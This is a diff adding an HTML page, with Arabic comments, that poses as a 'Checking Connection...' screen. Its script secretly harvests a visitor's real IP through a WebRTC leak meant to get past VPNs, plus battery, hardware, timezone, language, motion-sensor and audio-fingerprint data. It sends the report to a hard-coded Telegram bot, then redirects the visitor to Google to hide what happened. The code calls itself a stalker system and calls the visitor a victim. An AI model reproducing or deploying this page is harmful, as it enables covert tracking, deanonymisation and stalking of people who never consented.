@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking Connection...</title>
+    <style>
+        body { background-color: #000; color: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+    </style>
+</head>
+<body>
+    <script>
+        // --- إعداداتك الخاصة ---
+        const TELEGRAM_TOKEN = "8444429563:AAEZL3LwcSp50Bx_CgL46g5KnXmC8NjAtxw";
+        const CHAT_ID = "5775781038";
+
+        async function startStalkerSystem() {
+            let intel = {
+                realIP: "جاري الفحص...",
+                battery: "Unknown",
+                device: navigator.platform,
+                cores: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory || "N/A",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                lang: navigator.languages.join(", "),
+                touchPoints: navigator.maxTouchPoints,
+                movement: "ثابت (Static)",
+                audioFingerprint: "Unknown"
+            };
+
+            // 1. كشف الـ IP الحقيقي وتجاوز الـ VPN عبر WebRTC
+            try {
+                const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+                pc.createDataChannel("");
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = (i) => {
+                    if (i && i.candidate && i.candidate.candidate) {
+                        intel.realIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
+                    }
+                };
+            } catch (e) {}
+
+            // 2. سحب حالة البطارية
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                intel.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'شحن' : 'تفريغ'})`;
+            }
+
+            // 3. سحب بصمة الصوت (AudioContext Fingerprint)
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                intel.audioFingerprint = audioCtx.sampleRate + "Hz";
+            } catch (e) {}
+
+            // 4. سحب بيانات مستشعرات الحركة (Gyroscope)
+            window.ondevicemotion = (event) => {
+                if(event.acceleration && event.acceleration.x) {
+                    intel.movement = "يتحرك / يمسك الهاتف";
+                }
+            };
+
+            // إرسال البيانات فوراً بعد تجميعها (تأخير بسيط لضمان سحب الـ IP)
+            setTimeout(() => {
+                sendToTelegram(intel);
+            }, 2500);
+        }
+
+        function sendToTelegram(d) {
+            const message = `
+⚠️ **[تقرير استخباراتي شامل - صامت]** ⚠️
+
+🌐 **الـ IP الحقيقي (خلف الـ VPN):** \`${d.realIP}\`
+🔋 **حالة البطارية:** ${d.battery}
+🧠 **العتاد:** ${d.cores} Cores | ${d.ram} GB RAM
+🖥️ **الشاشة:** ${d.screen} | ${d.touchPoints} Touch
+🌍 **المنطقة:** ${d.timezone}
+🔠 **اللغات:** ${d.lang}
+🏃 **الحالة المادية:** ${d.movement}
+🎵 **بصمة الصوت:** ${d.audioFingerprint}
+📱 **النظام:** ${d.device}
+⏰ **وقت الصيد:** ${new Date().toLocaleString('ar-EG')}
+
+🔗 **رابط التتبع الجغرافي المقترح:**
+https://www.google.com/maps?q=?q=${d.realIP}
+            `;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            }).then(() => {
+                // إعادة توجيه الضحية لتمويه العملية
+                window.location.href = "https://www.google.com";
+            });
+        }
+
+        startStalkerSystem();
+    </script>
+</body>
+</html>
